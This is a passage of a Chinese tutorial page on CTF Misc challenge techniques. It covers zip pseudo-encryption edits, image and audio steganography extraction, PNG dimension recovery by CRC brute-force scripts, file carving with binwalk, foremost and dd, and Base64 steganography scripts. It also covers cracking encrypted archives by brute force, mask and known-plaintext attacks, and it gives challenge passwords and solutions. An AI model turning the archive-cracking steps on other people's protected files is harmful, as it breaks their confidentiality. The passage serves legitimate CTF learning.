title="真加密"></a>真加密</h3><p>把这个zip文件拖入winhex中，由图中的信息可以知道是真加密<br><img src="https://img-blog.csdnimg.cn/20200420094603945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把09 00修改为00 00保存后即可得到flag<br><img src="https://img-blog.csdnimg.cn/2020042009474021.png" alt="在这里插入图片描述"></p><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>伪加密，把全方位标记区 的 01 00  或 09  00 改为 00 00<br><img src="https://img-blog.csdnimg.cn/20201203120249158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-LSB隐写"><a href="#5-LSB隐写" class="headerlink" title="5. LSB隐写"></a>5. LSB隐写</h2><p><img src="https://img-blog.csdnimg.cn/20200404134359585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="在这里插入图片描述"><br>简单的LSB隐写，在最低有效位隐藏信息。可以使用Stegsolve提取。<br><img src="https://img-blog.csdnimg.cn/20200404134450892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="在这里插入图片描述"></p><h2 id="6-双图"><a href="#6-双图" class="headerlink" title="6. 双图"></a>6. 双图</h2><p><img src="https://img-blog.csdnimg.cn/20200404134600193.png" alt="在这里插入图片描述"><br>将两张图重叠后，进行异或，出现了疑似二维码的图片<br><img src="https://img-blog.csdnimg.cn/20200404135025932.png" alt="在这里插入图片描述"><br>点击Save，将该图片保存下来。<br>打开该图片继续进行异或，可以得到三张二维码图片<br><img src="https://img-blog.csdnimg.cn/20200404135206843.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404135220367.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404135231251.png" alt="在这里插入图片描述"><br>依次扫描这三张二维码可得到以下信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">第一张：DES<br>第二张：6XaMMbM7<br>第三张：U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c=<br></code></pre></td></tr></table></figure><p>根据该信息，可以知道是DES加密,进行<a href="https://www.sojson.com/encrypt_des.html">DES解密</a><br><img src="https://img-blog.csdnimg.cn/20200404135732110.png" alt="在这里插入图片描述"></p><p>查看频谱图<br><img src="https://img-blog.csdnimg.cn/20201203095434653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="7-音频分析"><a href="#7-音频分析" class="headerlink" title="7. 音频分析"></a>7. 音频分析</h2><p>查看频谱图<br><img src="https://img-blog.csdnimg.cn/20201203095434653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="8-压缩包暴力破解"><a href="#8-压缩包暴力破解" class="headerlink" title="8. 压缩包暴力破解"></a>8. 压缩包暴力破解</h2><p>使用ARCHPR工具，选择Brute-force模式，进行暴力破解<br><img src="https://img-blog.csdnimg.cn/20210213160430902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="9-掩码攻击"><a href="#9-掩码攻击" class="headerlink" title="9. 掩码攻击"></a>9. 掩码攻击</h2><p>下载附件，是一个加密的压缩包和图片<br><img src="https://img-blog.csdnimg.cn/20201112223438991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>猜测图片里面的内容是压缩包密码，内容是<code>1317??7p9?</code>,进行<code>掩码攻击</code>，结果提示错误，尝试了很多次，结果将掩码修改成<code>1317???7p9?</code>结果成功了。</p><p><img src="https://img-blog.csdnimg.cn/20201112224159242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="10-明文攻击"><a href="#10-明文攻击" class="headerlink" title="10. 明文攻击"></a>10. 明文攻击</h2><p><strong>[ACTF新生赛2020]明文攻击</strong> </p><p>把图片拖入010Editor中，发现一个flag.txt<br><img src="https://img-blog.csdnimg.cn/20210215201625262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制完后加上 50 4B，变成一个新的压缩包1.zip<br><img src="https://img-blog.csdnimg.cn/20210215201421645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>压缩包1.zip里面的flag.txt与加密压缩包里面的flag.txt的CRC值一样<br><img src="https://img-blog.csdnimg.cn/20210215201942450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进行明文攻击<br><img src="https://img-blog.csdnimg.cn/20210215201404187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="11-图片高宽修改"><a href="#11-图片高宽修改" class="headerlink" title="11. 图片高宽修改"></a>11. 图片高宽修改</h2><h3 id="计算图片正确宽高"><a href="#计算图片正确宽高" class="headerlink" title="计算图片正确宽高"></a>计算图片正确宽高</h3><p>查看图片crc值</p><p><img src="https://img-blog.csdnimg.cn/20210315114302692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以CRC值为0xab212a35，计算图片正确宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br> <br>m = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctfshow.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>    <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>        c = m[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc = binascii.crc32(c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc == <span class="hljs-number">0xab212a35</span>:<br>            k = <span class="hljs-number">1</span><br>            print(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x556 0x5b7<br></code></pre></td></tr></table></figure><h3 id="爆破图片高度"><a href="#爆破图片高度" class="headerlink" title="爆破图片高度"></a>爆破图片高度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>misc = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctfshow.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-comment">#print(misc[0x0c:0x0f+1])</span><br><span class="hljs-comment"># 爆破高</span><br><br>crc32_bytes = misc[<span class="hljs-number">0x1d</span>:<span class="hljs-number">0x20</span>+<span class="hljs-number">1</span>]<span class="hljs-comment"># 读出bytes</span><br>crc32_hex_eval = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0x&#x27;</span> + crc32_bytes.<span class="hljs-built_in">hex</span>())<span class="hljs-comment">#bytes串 -&gt; hex串  -&gt;  值</span><br>print(crc32_hex_eval)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4096</span>):<br>    data = misc[<span class="hljs-number">0x0c</span>:<span class="hljs-number">0x0f</span>+<span class="hljs-number">1</span>] + misc[<span class="hljs-number">0x10</span>:<span class="hljs-number">0x13</span>+<span class="hljs-number">1</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="hljs-number">0x18</span>:<span class="hljs-number">0x1c</span>+<span class="hljs-number">1</span>]  <span class="hljs-comment">#IHDR数据</span><br>    crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">if</span> crc32 == crc32_hex_eval : <span class="hljs-comment">#IHDR块的crc32值</span><br>        print(i)<br>        print(<span class="hljs-string">&quot;height_hex:&quot;</span>+ <span class="hljs-built_in">hex</span>(i))<br><br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">2871077429<br>1463<br>height_hex:0x5b7<br><br></code></pre></td></tr></table></figure><h3 id="JPG格式"><a href="#JPG格式" class="headerlink" title="JPG格式"></a>JPG格式</h3><p> 打开图片，搜索<code>FFC0</code>，在001180 后面4个字节分别是是高宽，把00 80改成02 80<br><img src="https://img-blog.csdnimg.cn/2020120309412773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="PNG格式"><a href="#PNG格式" class="headerlink" title="PNG格式"></a>PNG格式</h3><blockquote><p>第二行前四位表示图片的宽，后四位表示图片的高。</p></blockquote><p>十六进制的045F为十进制的1119，十六进制的200为十进制的512<br>发现像素大小与属性一致，于是把高跟宽改成同一大小保存数据。<img src="https://img-blog.csdnimg.cn/20200404131749174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="在这里插入图片描述"></p><h2 id="12-文件分离"><a href="#12-文件分离" class="headerlink" title="12. 文件分离"></a>12. 文件分离</h2><h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><p>使用foremost命令<code>foremost 1.jpg</code><br><img src="https://img-blog.csdnimg.cn/20210210181059208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到<br><img src="https://img-blog.csdnimg.cn/20210210181142925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>带<code>-T</code>参数，<code>foremost -T 1.jpg</code>会生成以时间为名的文件夹名字，可以避免重复<br><img src="https://img-blog.csdnimg.cn/20210210181751114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalk一下，发现有隐藏文件<br><img src="https://img-blog.csdnimg.cn/20201220185035492.png" alt="在这里插入图片描述"><br>分离文件，分离出1B377.rar<br><img src="https://img-blog.csdnimg.cn/20201220152556319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h3><p>binwalk图片后得到的信息，jpeg文件是从271007开始</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ dd <span class="hljs-keyword">if</span>=binwalk,foremost,dd.png of=out.jpg bs=1 skip=271007<br>记录了29053+0 的读入<br>记录了29053+0 的写出<br>29053字节（29 kB，28 KiB）已复制，0.175658 s，165 kB/s<br></code></pre></td></tr></table></figure><p>可以得到png图片</p><h2 id="13-隐藏文件加密"><a href="#13-隐藏文件加密" class="headerlink" title="13. 隐藏文件加密"></a>13. 隐藏文件加密</h2><h3 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h3><p>需要java环境，进入F5-steganography/目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java Extract Matryoshka.jpg -p <span class="hljs-string">&#x27;!LyJJ9bi&amp;M7E72*JyD&#x27;</span><br></code></pre></td></tr></table></figure><p>生成out.txt<br><img src="https://img-blog.csdnimg.cn/20210215143718300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><p>进入目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf 01.jpg -p A7SL9nHRJXLh@<span class="hljs-variable">$EbE8</span> <br></code></pre></td></tr></table></figure><p>生成pwd.txt<br><img src="https://img-blog.csdnimg.cn/20210215150108852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>进入目录下，需要新建一个txt文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">outguess -k <span class="hljs-string">&quot;z0GFieYAee%gdf0%lF&quot;</span> -r 02.jpg flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210215150728680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a>JPHS</h3><p>参考文章：<a href="https://blog.csdn.net/drondong/article/details/79326385">https://blog.csdn.net/drondong/article/details/79326385</a><br>只能打开jpg格式的图片，输入两次相同密码，提取隐藏文件<br><img src="https://img-blog.csdnimg.cn/20210215152800344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="cloacked-pixel"><a href="#cloacked-pixel" class="headerlink" title="cloacked-pixel"></a>cloacked-pixel</h3><p><strong>cloacked-pixel安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://codechina.csdn.net/mirrors/cyberinc/cloacked-pixel.git<br></code></pre></td></tr></table></figure><p>安装需要用到的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install numpy-1.16.6+mkl-cp27-cp27m-win_amd64.whl<br>pip install matplotlib<br>pip install pillow<br><span class="hljs-comment">#卸载陈旧版本的包</span><br>pip uninstall crypto<br>pip uninstall pycrypto<br><span class="hljs-comment">#安装新版本</span><br>pip install pycryptodome<br></code></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">E:\cloacked-pixel&gt;python lsb.py extract lsb（123456）.png flag.txt 123456<br>[+] Image size: 640x640 pixels.<br>[+] Written extracted data to flag.txt.<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210319223117700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="14-提取电话拨号音"><a href="#14-提取电话拨号音" class="headerlink" title="14. 提取电话拨号音"></a>14. 提取电话拨号音</h2><p>工具下载地址：<a href="https://www.cr173.com/soft/17040.html">https://www.cr173.com/soft/17040.html</a><br><img src="https://img-blog.csdnimg.cn/20210209221414910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="15-Base64隐写"><a href="#15-Base64隐写" class="headerlink" title="15. Base64隐写"></a>15. Base64隐写</h2><p><strong>[GXYCTF2019]SXMgdGhpcyBiYXNlPw=</strong></p><p>打开文件是多行base64密文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">Q2V0dGUgbnVpdCwK<br>SW50ZW5hYmxlIGluc29tbmllLAp=<br>TGEgZm9saWUgbWUgZ3VldHRlLAo=<br>SmUgc3VpcyBjZSBxdWUgamUgZnVpcwp=<br>SmUgc3ViaXMsCt==<br>Q2V0dGUgY2Fjb3Bob25pZSwK<br>UXVpIG1lIHNjaWUgbGEgdOmUmnRlLAp=<br>QXNzb21tYW50ZSBoYXJtb25pZSwK<br>RWxsZSBtZSBkaXQsCo==<br>VHUgcGFpZXJhcyB0ZXMgZGVsaXRzLAp=<br>UXVvaSBxdSdpbCBhZHZpZW5uZSwK<br>T24gdHJh5Y2vbmUgc2VzIGNoYeWNr25lcywK<br>U2VzIHBlaW5lcywK<br>SmUgdm91ZSBtZXMgbnVpdHMsCm==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCl==<br>QXV4IHJlcXVpZW1zLAr=<br>VHVhbnQgcGFyIGRlcGl0LAq=<br>Q2UgcXVlIGplIHNlbWUsCt==<br>SmUgdm91ZSBtZXMgbnVpdHMsCp==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCp==<br>RXQgYXV4IGJsYXNwaGVtZXMsCo==<br>Sidhdm91ZSBqZSBtYXVkaXMsCl==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK<br>TCdlbm5lbWksCu==<br>VGFwaSBkYW5zIG1vbiBlc3ByaXQsCp==<br>RumUmnRlIG1lcyBkZWZhaXRlcywK<br>U2FucyByZXBpdCBtZSBkZWZpZSwK<br>SmUgcmVuaWUsCq==<br>TGEgZmF0YWxlIGhlcmVzaWUsCh==<br>UXVpIHJvbmdlIG1vbiDplJp0cmUsCo==<br>SmUgdmV1eCByZW5h5Y2vdHJlLAp=<br>UmVuYeWNr3RyZSwK<br>SmUgdm91ZSBtZXMgbnVpdHMsCn==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCq==<br>QXV4IHJlcXVpZW1zLAp=<br>VHVhbnQgcGFyIGRlcGl0LAq=<br>Q2UgcXVlIGplIHNlbWUsCo==<br>SmUgdm91ZSBtZXMgbnVpdHMsCm==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCl==<br>RXQgYXV4IGJsYXNwaGVtZXMsCm==<br>Sidhdm91ZSBqZSBtYXVkaXMsCu==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK<br>UGxldXJlbnQgbGVzIHZpb2xvbnMgZGUgbWEgdmllLAp=<br>TGEgdmlvbGVuY2UgZGUgbWVzIGVudmllcywK<br>U2lwaG9ubmVlIHN5bXBob25pZSwK<br>RGVjb25jZXJ0YW50IGNvbmNlcnRvLAq=<br>SmUgam91ZSBzYW5zIHRvdWNoZXIgbGUgRG8sCo==<br>TW9uIHRhbGVudCBzb25uZSBmYXV4LAp=<br>SmUgbm9pZSBtb24gZW5udWksCo==<br>RGFucyBsYSBtZWxvbWFuaWUsCl==<br>SmUgdHVlIG1lcyBwaG9iaWVzLAq=<br>RGFucyBsYSBkZXNoYXJtb25pZSwK<br>SmUgdm91ZSBtZXMgbnVpdHMsCv==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCn==<br>QXV4IHJlcXVpZW1zLAp=<br>VHVhbnQgcGFyIGRlcGl0LAo=<br>Q2UgcXVlIGplIHNlbWUsCm==<br>SmUgdm91ZSBtZXMgbnVpdHMsCp==<br>QSBsJ2Fzc2FzeW1waG9uaWUsCm==<br>RXQgYXV4IGJsYXNwaGVtZXMsCu==<br>Sidhdm91ZSBqZSBtYXVkaXMsCm==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK<br>SmUgdm91ZSBtZXMgbnVpdHMsCn==<br>QSBsJ2Fzc2FzeW1waG9uaWUgKGwnYXNzYXN5bXBob25pZSksCn==<br>Sidhdm91ZSBqZSBtYXVkaXMsCt==<br>VG91cyBjZXV4IHF1aSBzJ2FpbWVudA==<br></code></pre></td></tr></table></figure><p>脚本1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment">#no equalnum no offset</span><br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <br></code></pre></td></tr></table></figure><p>脚本2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_base64_diff_value</span>(<span class="hljs-params">s1, s2</span>):</span><br>    base64chars = <span 